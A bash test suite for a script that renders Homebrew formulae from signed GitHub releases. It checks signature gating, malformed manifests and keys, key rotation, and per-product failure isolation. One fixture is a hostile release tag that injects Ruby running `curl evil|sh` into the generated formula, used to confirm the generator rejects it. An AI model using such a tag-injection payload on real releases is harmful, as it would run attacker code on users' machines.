#!/usr/bin/env bash
#
# Tests for scripts/render-formulae.sh — the generator that turns a product's
# signed release into the formula `brew install` uses.
#
# Why this is worth testing at all: update.yml commits this generator's output
# straight to `main`, so there is no pull request between a bug here and a user
# installing its result. The properties below are the ones that keep that safe —
# the signature gate is fail-closed, one product's broken release cannot remove
# or hold back another's, and what the table declares is what the formula says.
#
# Nothing here touches the network. A stub `gh` on PATH serves a synthetic
# release out of a fixture directory, and the release is signed with an
# ephemeral Ed25519 key passed to the generator with --pubkey; the org key
# stays the default for a run with no arguments.
#
# Requires: python3 with cryptography, bash 4+.

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
GENERATOR="$HERE/scripts/render-formulae.sh"
WORK="$(mktemp -d)"
RELEASES="$WORK/releases"
BIN="$WORK/bin"

cleanup() { rm -rf "$WORK"; }
trap cleanup EXIT

pass=0
fail=0

check() { # <description> <expected> <actual>
	if [ "$2" = "$3" ]; then
		echo "ok    $1"
		pass=$((pass + 1))
	else
		echo "FAIL  $1"
		echo "        expected: $2"
		echo "        actual:   $3"
		fail=$((fail + 1))
	fi
}

contains() { # <description> <file> <substring>
	if grep -qF -- "$3" "$2" 2>/dev/null; then
		echo "ok    $1"
		pass=$((pass + 1))
	else
		echo "FAIL  $1"
		echo "        $2 does not contain: $3"
		fail=$((fail + 1))
	fi
}

# --- an ephemeral signing key, and a stub gh that serves fixtures ------------

mkdir -p "$BIN" "$RELEASES"
PUBKEY="$(python3 - "$WORK" <<'PY'
import base64, os, sys
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives import serialization
key = Ed25519PrivateKey.generate()
raw = key.private_bytes(encoding=serialization.Encoding.Raw,
                        format=serialization.PrivateFormat.Raw,
                        encryption_algorithm=serialization.NoEncryption())
open(os.path.join(sys.argv[1], "signing.key"), "wb").write(raw)
pub = key.public_key().public_bytes(encoding=serialization.Encoding.Raw,
                                    format=serialization.PublicFormat.Raw)
# Unpadded, the way the generator stores and re-pads it.
print(base64.b64encode(pub).decode().rstrip("="))
PY
)"

# `gh release view --repo R --json tagName --jq .tagName` prints the tag stored
# for that repo; `gh release download TAG --repo R ... --dir D` copies the
# fixture's SHA256SUMS pair into D. Anything else is a test bug, not a silent
# pass, so it exits non-zero.
cat > "$BIN/gh" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
sub="${1:-}"; shift || true
repo=""; dir=""
args=("$@")
for ((i = 0; i < ${#args[@]}; i++)); do
	case "${args[i]}" in
		--repo) repo="${args[i+1]}" ;;
		--dir)  dir="${args[i+1]}" ;;
	esac
done
slug="${repo//\//__}"
base="$RELEASES/$slug"
case "$sub" in
	release)
		what="${args[0]}"
		[ -d "$base" ] || { echo "release not found" >&2; exit 1; }
		if [ "$what" = "view" ]; then
			cat "$base/tag"
		else
			cp "$base/SHA256SUMS" "$dir/SHA256SUMS" 2>/dev/null || exit 1
			cp "$base/SHA256SUMS.sig" "$dir/SHA256SUMS.sig" 2>/dev/null || exit 1
		fi
		;;
	*) echo "stub gh: unexpected subcommand $sub" >&2; exit 90 ;;
esac
SH
chmod +x "$BIN/gh"
export RELEASES
export PATH="$BIN:$PATH"

# Publish a synthetic release: a SHA256SUMS listing the given assets, signed
# with the ephemeral key.
publish() { # $1=repo $2=tag $3...=asset names
	local repo="$1" tag="$2"; shift 2
	local slug="${repo//\//__}" base
	base="$RELEASES/$slug"
	rm -rf "$base"; mkdir -p "$base"
	printf '%s' "$tag" > "$base/tag"
	: > "$base/SHA256SUMS"
	local i=0 asset
	for asset in "$@"; do
		i=$((i + 1))
		printf '%064d  %s\n' "$i" "$asset" >> "$base/SHA256SUMS"
	done
	python3 - "$WORK/signing.key" "$base/SHA256SUMS" "$base/SHA256SUMS.sig" <<'PY'
import sys
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
key = Ed25519PrivateKey.from_private_bytes(open(sys.argv[1], "rb").read())
open(sys.argv[3], "wb").write(key.sign(open(sys.argv[2], "rb").read()))
PY
}

# Re-sign a hand-built SHA256SUMS so the generator still sees a valid signature.
# The point of these cases is malformed CONTENT behind a good signature.
resign() { # $1=sums file $2=repo
	local base="$RELEASES/${2//\//__}"
	cp "$1" "$base/SHA256SUMS"
	python3 - "$WORK/signing.key" "$base/SHA256SUMS" "$base/SHA256SUMS.sig" <<'SIGN'
import sys
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
key = Ed25519PrivateKey.from_private_bytes(open(sys.argv[1], "rb").read())
open(sys.argv[3], "wb").write(key.sign(open(sys.argv[2], "rb").read()))
SIGN
}

# A copy of the generator whose PRODUCTS table is replaced wholesale. Replacing
# the block rather than editing fields keeps these tests working when the table
# gains a column — it gained two while the generator was being rewritten.
generator_with() { # $1=destination $2...=table rows
	local dest="$1"; shift
	local rows
	rows="$(printf '\t"%s"\n' "$@")"
	awk -v rows="$rows" '
		/^PRODUCTS=\(/ { print; print rows; inside = 1; next }
		inside && /^\)/ { print; inside = 0; next }
		!inside        { print }
	' "$GENERATOR" > "$dest"
	chmod +x "$dest"
}

run() { # $1=script $2=repo root ; prints nothing, returns the exit status
	( cd "$2" && "$1" --pubkey "$PUBKEY" ) > "$WORK/out" 2>&1
}

# A repo root with a Formula/ directory, for the generator to write into.
new_root() { # $1=path
	rm -rf "$1"; mkdir -p "$1/scripts" "$1/Formula"
}

PODUP="Glyndor/podup|podup|Podup|MIT|Docker-compose translator|podup-darwin-arm64|podup-darwin-x86_64|--version"

# --- the happy path ---------------------------------------------------------

publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-x86_64
new_root "$WORK/r1"
generator_with "$WORK/r1/scripts/render-formulae.sh" "$PODUP"
rc=0; run "$WORK/r1/scripts/render-formulae.sh" "$WORK/r1" || rc=$?
check "a verified release renders and exits 0" "0" "$rc"

F="$WORK/r1/Formula/podup.rb"
contains "the version comes from the release tag" "$F" 'version "9.9.9"'
contains "the arm64 url points at the tagged asset" "$F" \
	'url "https://github.com/Glyndor/podup/releases/download/v9.9.9/podup-darwin-arm64"'
contains "the arm64 checksum is the one the signed manifest declares" "$F" \
	'sha256 "0000000000000000000000000000000000000000000000000000000000000001"'
contains "the x86_64 checksum is the one the signed manifest declares" "$F" \
	'sha256 "0000000000000000000000000000000000000000000000000000000000000002"'
contains "the licence comes from the table" "$F" 'license "MIT"'
contains "the version check comes from the table" "$F" 'system "#{bin}/podup", "--version"'
contains "install uses the asset name, not a glob" "$F" \
	'asset = Hardware::CPU.arm? ? "podup-darwin-arm64" : "podup-darwin-x86_64"'

# The table is the only place these come from, so prove they are not constants.
new_root "$WORK/r2"
generator_with "$WORK/r2/scripts/render-formulae.sh" \
	"Glyndor/podup|podup|Podup|Apache-2.0|d|podup-darwin-arm64|podup-darwin-x86_64|version"
run "$WORK/r2/scripts/render-formulae.sh" "$WORK/r2" || true
contains "a non-MIT licence in the table reaches the formula" \
	"$WORK/r2/Formula/podup.rb" 'license "Apache-2.0"'
contains "a different version check in the table reaches the formula" \
	"$WORK/r2/Formula/podup.rb" 'system "#{bin}/podup", "version"'

# --- fail closed ------------------------------------------------------------

# A signature made with the wrong key must not produce a formula.
publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-x86_64
printf 'not a signature' > "$RELEASES/Glyndor__podup/SHA256SUMS.sig"
new_root "$WORK/r3"
generator_with "$WORK/r3/scripts/render-formulae.sh" "$PODUP"
rc=0; run "$WORK/r3/scripts/render-formulae.sh" "$WORK/r3" || rc=$?
check "an unverifiable signature skips the product" "3" "$rc"
check "and writes no formula" "0" "$(find "$WORK/r3/Formula" -name '*.rb' | wc -l)"

# An asset the table names but the verified manifest does not list.
publish Glyndor/podup v9.9.9 podup-darwin-arm64
new_root "$WORK/r4"
generator_with "$WORK/r4/scripts/render-formulae.sh" "$PODUP"
rc=0; run "$WORK/r4/scripts/render-formulae.sh" "$WORK/r4" || rc=$?
check "an asset missing from the manifest skips the product" "3" "$rc"
check "and writes no formula" "0" "$(find "$WORK/r4/Formula" -name '*.rb' | wc -l)"

# A product whose release cannot be read at all.
new_root "$WORK/r5"
generator_with "$WORK/r5/scripts/render-formulae.sh" \
	"Glyndor/nothing-here|nothing|Nothing|MIT|d|a-arm64|a-x86_64|--version"
rc=0; run "$WORK/r5/scripts/render-formulae.sh" "$WORK/r5" || rc=$?
check "an unreadable release skips the product" "3" "$rc"

# A table row with a field missing is named, not rendered from empty values.
new_root "$WORK/r6"
generator_with "$WORK/r6/scripts/render-formulae.sh" \
	"Glyndor/podup|podup|Podup|MIT|d|podup-darwin-arm64|podup-darwin-x86_64"
rc=0; run "$WORK/r6/scripts/render-formulae.sh" "$WORK/r6" || rc=$?
check "a short table row is rejected" "3" "$rc"
contains "and the missing field is named" "$WORK/out" "has no version_check"

# --- one product must not take down another ---------------------------------

publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-x86_64
new_root "$WORK/r7"
generator_with "$WORK/r7/scripts/render-formulae.sh" \
	"Glyndor/nothing-here|ghostly|Ghostly|MIT|d|a-arm64|a-x86_64|--version" "$PODUP"
printf 'PRE-EXISTING\n' > "$WORK/r7/Formula/ghostly.rb"
rc=0; run "$WORK/r7/scripts/render-formulae.sh" "$WORK/r7" || rc=$?
check "a broken product does not stop a good one" "1" \
	"$(grep -c 'version "9.9.9"' "$WORK/r7/Formula/podup.rb")"
check "the run still fails, so the skip is not silent" "3" "$rc"
check "the skipped product keeps the formula it had" "PRE-EXISTING" \
	"$(cat "$WORK/r7/Formula/ghostly.rb")"

# --- pruning ----------------------------------------------------------------

new_root "$WORK/r8"
generator_with "$WORK/r8/scripts/render-formulae.sh" "$PODUP"
printf 'stale\n' > "$WORK/r8/Formula/gone.rb"
rc=0; run "$WORK/r8/scripts/render-formulae.sh" "$WORK/r8" || rc=$?
check "pruning a dropped product exits 0" "0" "$rc"
check "the dropped product's formula is gone" "0" \
	"$(find "$WORK/r8/Formula" -name 'gone.rb' | wc -l)"
check "the declared product's formula stays" "1" \
	"$(find "$WORK/r8/Formula" -name 'podup.rb' | wc -l)"

# --- the key is an argument, not an environment variable --------------------

rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey ) >/dev/null 2>&1 || rc=$?
check "--pubkey without a value is a usage error" "2" "$rc"
rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --wat ) >/dev/null 2>&1 || rc=$?
check "an unknown argument is a usage error" "2" "$rc"
rc=0
( cd "$WORK/r1" && RELEASE_PUBKEY_B64="$PUBKEY" "$WORK/r1/scripts/render-formulae.sh" ) >/dev/null 2>&1 || rc=$?
check "the environment cannot swap the trust anchor" "3" "$rc"

# --- two key slots, so a rotation can be made-before-break ------------------
#
# The org rotation signs with the old key while both are published, and only
# then switches. A renderer with one slot verifies fine through that first
# phase and starts failing when the second lands -- silently, because the
# channel is pull-based and a failed render just stops updating the tap.

rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey2 ) >/dev/null 2>&1 || rc=$?
check "--pubkey2 without a value is a usage error" "2" "$rc"

# The real release is signed with $PUBKEY. Put it in the SECOND slot behind a
# wrong-but-well-formed first key: the render must still succeed, which is the
# whole point of the second slot.
OTHER="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" \
	--pubkey "$OTHER" --pubkey2 "$PUBKEY" ) >/dev/null 2>&1 || rc=$?
check "a release signed by the second key still verifies" "0" "$rc"

# And the reverse: the first slot alone is enough, an empty second changes
# nothing.
rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey "$PUBKEY" ) >/dev/null 2>&1 || rc=$?
check "the first key alone still verifies" "0" "$rc"

# Exhausting both slots is an error, not a fallthrough. This is the property
# that must survive: two wrong keys fail exactly as one wrong key did.
rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" \
	--pubkey "$OTHER" --pubkey2 "$OTHER" ) >/dev/null 2>&1 || rc=$?
check "two wrong keys still fail closed" "3" "$rc"

# --- the release tag is remote text, and it lands in generated Ruby ---------
#
# SHA256SUMS is signed and its digests are checked to be 64 hex characters. The
# TAG travels beside that signature rather than inside it, and it reaches an
# unquoted heredoc that writes Ruby. A tag that closes the version string
# appends code that runs on every `brew install`.
#
# The fixture below is signed with the real ephemeral key, because that is the
# actual scenario: a perfectly valid signature over the digests, and a hostile
# tag alongside it.
publish "Glyndor/podup" 'v1.0.0"
  def self.pwned; system("curl evil|sh"); end
  version "1.0.0' podup-darwin-arm64 podup-darwin-x86_64
rc=0
out="$( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey "$PUBKEY" 2>&1 )" || rc=$?
check "a release tag carrying Ruby is refused" "3" "$rc"
check "and the error names the tag rather than the signature" "1" \
	"$(printf '%s' "$out" | grep -c 'not a plain version')"
# `grep -c` exits 1 on zero matches, so a `|| echo 0` fallback fires ON TOP of
# the 0 grep already printed and yields two lines. Count with a pipeline whose
# exit code nobody reads instead.
check "and no formula was written from it" "0" \
	"$(grep -c 'def self.pwned' < "$WORK/r1/Formula/podup.rb" 2>/dev/null | tr -d '\n')"

# Tags that are merely unusual must still render, or the guard is a version
# policy rather than an injection guard.
for good in "v1.0.0-rc.1" "v1.0.0+build.5" "v10.20.30"; do
	publish "Glyndor/podup" "$good" podup-darwin-arm64 podup-darwin-x86_64
	rc=0
	( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" --pubkey "$PUBKEY" ) >/dev/null 2>&1 || rc=$?
	check "the ordinary tag $good still renders" "0" "$rc"
done

# Restore the fixture the later cases expect.
publish "Glyndor/podup" "v1.2.3" podup-darwin-arm64 podup-darwin-x86_64

# --- a broken trust anchor is not a bad signature ---------------------------
#
# `except Exception: continue` around the verify call collapsed "this key did
# not sign it" and "this key is not a key" into one message. The operator then
# read "does not verify against any configured release key" and went looking at
# the upstream release for a fault that was in this repository.
#
# The three shapes below are the ones that reach it: not base64 at all, too
# short, and the right alphabet but the wrong length. Each must say the key is
# malformed and say which way.

for bad_case in \
	"AAAA!!!!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|Only base64 data is allowed|not base64" \
	"AAAA|3 bytes|too short" \
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|33 bytes|one byte too long"; do
	bad_key="${bad_case%%|*}"; rest="${bad_case#*|}"
	needle="${rest%%|*}"; label="${rest#*|}"
	rc=0
	out="$( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" \
		--pubkey "$bad_key" 2>&1 )" || rc=$?
	check "a key that is $label is refused" "3" "$rc"
	check "and it is named as malformed, not as a failed signature ($label)" "1" \
		"$(printf '%s' "$out" | grep -c 'malformed release public key')"
	check "and the message says how it is malformed ($label)" "1" \
		"$(printf '%s' "$out" | grep -cF "$needle")"
done

# A key pasted with whitespace on the ends still loads. It arrives here as a
# shell argument, so a value copied from anywhere brings whatever came with it;
# rejecting that as "not base64" would point at the key when the fault is a
# trailing newline. Whitespace INSIDE stays an error: unlike a gpg fingerprint,
# a base64 key has no grouped display convention to accommodate.
rc=0
( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" \
	--pubkey "  $PUBKEY
" ) >/dev/null 2>&1 || rc=$?
check "a key pasted with whitespace on the ends still verifies" "0" "$rc"

rc=0
out="$( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" \
	--pubkey "$(printf '%s' "$PUBKEY" | sed 's/^\(..........\)/\1 /')" 2>&1 )" || rc=$?
check "but whitespace inside the key is still refused" "3" "$rc"
check "and it is named as malformed" "1" \
	"$(printf '%s' "$out" | grep -c 'malformed release public key')"

# The mirror image, so the cases above are not satisfied by a renderer that
# calls every key malformed: a well-formed key that simply did not sign this
# release must still be reported as a signature failure, not as a broken key.
rc=0
out="$( cd "$WORK/r1" && "$WORK/r1/scripts/render-formulae.sh" \
	--pubkey "$OTHER" 2>&1 )" || rc=$?
check "a well-formed key that did not sign it fails as a signature" "3" "$rc"
check "and is NOT reported as malformed" "0" \
	"$(printf '%s' "$out" | grep -c 'malformed release public key')"
check "and says the signature did not verify" "1" \
	"$(printf '%s' "$out" | grep -c 'does not verify against any configured release key')"

# --- a signed manifest can still be malformed --------------------------------

# A duplicated entry used to render BOTH hashes into one field and exit 0.
publish Glyndor/podup v9.9.9 podup-darwin-arm64 podup-darwin-arm64 podup-darwin-x86_64
new_root "$WORK/r9"
generator_with "$WORK/r9/scripts/render-formulae.sh" "$PODUP"
rc=0; run "$WORK/r9/scripts/render-formulae.sh" "$WORK/r9" || rc=$?
check "an asset listed twice is rejected" "3" "$rc"
contains "and the error says how many times" "$WORK/out" "lists podup-darwin-arm64 2 times"
check "and no formula is written" "0" "$(find "$WORK/r9/Formula" -name '*.rb' | wc -l)"

publish Glyndor/podup v9.9.9 podup-darwin-x86_64
{
	printf 'nothexadecimal!!nothexadecimal!!nothexadecimal!!nothexadecimal!!  podup-darwin-arm64\n'
	cat "$RELEASES/Glyndor__podup/SHA256SUMS"
} > "$WORK/tmpsums"
resign "$WORK/tmpsums" Glyndor/podup
new_root "$WORK/r10"
generator_with "$WORK/r10/scripts/render-formulae.sh" "$PODUP"
rc=0; run "$WORK/r10/scripts/render-formulae.sh" "$WORK/r10" || rc=$?
check "a non-hexadecimal checksum is rejected" "3" "$rc"
contains "and the error says why" "$WORK/out" "is not hexadecimal"

publish Glyndor/podup v9.9.9 podup-darwin-x86_64
{
	printf 'abcdef  podup-darwin-arm64\n'
	cat "$RELEASES/Glyndor__podup/SHA256SUMS"
} > "$WORK/tmpsums"
resign "$WORK/tmpsums" Glyndor/podup
new_root "$WORK/r11"
generator_with "$WORK/r11/scripts/render-formulae.sh" "$PODUP"
rc=0; run "$WORK/r11/scripts/render-formulae.sh" "$WORK/r11" || rc=$?
check "a short digest is rejected" "3" "$rc"
contains "and the error gives the length" "$WORK/out" "is 6 characters, not 64"

# --- two healthy products together -------------------------------------------
# The plain multi-product case: the suite otherwise only ever pairs a good
# product with a broken one, and this is the shape the second real product takes.

publish Glyndor/podup v1.2.3 podup-darwin-arm64 podup-darwin-x86_64
publish Glyndor/other v4.5.6 other-darwin-arm64 other-darwin-x86_64
new_root "$WORK/r12"
generator_with "$WORK/r12/scripts/render-formulae.sh" \
	"Glyndor/podup|podup|Podup|MIT|first|podup-darwin-arm64|podup-darwin-x86_64|--version" \
	"Glyndor/other|other|Other|Apache-2.0|second|other-darwin-arm64|other-darwin-x86_64|-V"
rc=0; run "$WORK/r12/scripts/render-formulae.sh" "$WORK/r12" || rc=$?
check "two healthy products both render, exit 0" "0" "$rc"
check "both formulae exist" "2" "$(find "$WORK/r12/Formula" -name '*.rb' | wc -l)"
contains "each gets its own version" "$WORK/r12/Formula/podup.rb" 'version "1.2.3"'
contains "including the second" "$WORK/r12/Formula/other.rb" 'version "4.5.6"'
contains "each gets its own licence" "$WORK/r12/Formula/other.rb" 'license "Apache-2.0"'
contains "and its own version check" "$WORK/r12/Formula/other.rb" 'system "#{bin}/other", "-V"'
contains "the first is untouched by the second" "$WORK/r12/Formula/podup.rb" 'license "MIT"'

# --- a product that ships one architecture ----------------------------------
# klyradb publishes a single Windows build and a single macOS one; before this,
# a row had to name both assets, so such a product could not be carried at all.

publish Glyndor/single v2.0.0 single-darwin-x86_64
new_root "$WORK/r13"
generator_with "$WORK/r13/scripts/render-formulae.sh" \
	"Glyndor/single|single|Single|MIT|intel only|-|single-darwin-x86_64|--version"
rc=0; run "$WORK/r13/scripts/render-formulae.sh" "$WORK/r13" || rc=$?
check "an intel-only product renders, exit 0" "0" "$rc"
S="$WORK/r13/Formula/single.rb"
contains "the intel block is present" "$S" 'url "https://github.com/Glyndor/single/releases/download/v2.0.0/single-darwin-x86_64"'
check "and no arm block is emitted" "0" "$(grep -c 'on_arm' "$S")"
contains "install takes the one asset directly" "$S" 'bin.install "single-darwin-x86_64" => "single"'
check "with no Hardware::CPU branch" "0" "$(grep -c 'Hardware::CPU' "$S")"

publish Glyndor/single v2.0.0 single-darwin-arm64
new_root "$WORK/r14"
generator_with "$WORK/r14/scripts/render-formulae.sh" \
	"Glyndor/single|single|Single|MIT|arm only|single-darwin-arm64|-|--version"
rc=0; run "$WORK/r14/scripts/render-formulae.sh" "$WORK/r14" || rc=$?
check "an arm-only product renders, exit 0" "0" "$rc"
S="$WORK/r14/Formula/single.rb"
check "and no intel block is emitted" "0" "$(grep -c 'on_intel' "$S")"
contains "install takes the one asset directly" "$S" 'bin.install "single-darwin-arm64" => "single"'

# "-" must not become a way to publish nothing at all.
new_root "$WORK/r15"
generator_with "$WORK/r15/scripts/render-formulae.sh" \
	"Glyndor/single|single|Single|MIT|neither|-|-|--version"
rc=0; run "$WORK/r15/scripts/render-formulae.sh" "$WORK/r15" || rc=$?
check "a row publishing neither architecture is rejected" "3" "$rc"
contains "and says so" "$WORK/out" "publishes neither architecture"

# An empty field is a dropped column, not a declaration.
new_root "$WORK/r16"
generator_with "$WORK/r16/scripts/render-formulae.sh" \
	"Glyndor/single|single|Single|MIT|empty arm||single-darwin-x86_64|--version"
rc=0; run "$WORK/r16/scripts/render-formulae.sh" "$WORK/r16" || rc=$?
check "an EMPTY field is still an error, not a declaration" "3" "$rc"
contains "and names the field" "$WORK/out" "has no arm"

# A declared architecture that does not arrive stays a hard error.
publish Glyndor/single v2.0.0 single-darwin-x86_64
new_root "$WORK/r17"
generator_with "$WORK/r17/scripts/render-formulae.sh" \
	"Glyndor/single|single|Single|MIT|arm declared|single-darwin-arm64|single-darwin-x86_64|--version"
rc=0; run "$WORK/r17/scripts/render-formulae.sh" "$WORK/r17" || rc=$?
check "a DECLARED architecture that is missing still fails" "3" "$rc"

# The single-architecture shape is one CI's `brew style` never sees: that job
# runs over Formula/ in the repository, which carries only the two-architecture
# podup. Validate it here when a validator exists, and say so when none does —
# skipping silently would leave the new shape unchecked everywhere.
if command -v brew >/dev/null 2>&1; then
	rc=0
	brew style "$WORK/r13/Formula/single.rb" >"$WORK/style" 2>&1 || rc=$?
	check "brew style accepts an intel-only formula" "0" "$rc"
	rc=0
	brew style "$WORK/r14/Formula/single.rb" >>"$WORK/style" 2>&1 || rc=$?
	check "brew style accepts an arm-only formula" "0" "$rc"
elif command -v ruby >/dev/null 2>&1; then
	rc=0; ruby -c "$WORK/r13/Formula/single.rb" >/dev/null 2>&1 || rc=$?
	check "the intel-only formula is syntactically valid Ruby" "0" "$rc"
	rc=0; ruby -c "$WORK/r14/Formula/single.rb" >/dev/null 2>&1 || rc=$?
	check "the arm-only formula is syntactically valid Ruby" "0" "$rc"
	echo "note  brew is absent, so only Ruby syntax was checked"
else
	echo "note  neither brew nor ruby is present; the single-architecture formulae"
	echo "note  were generated but NOT validated in this run"
fi

echo
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
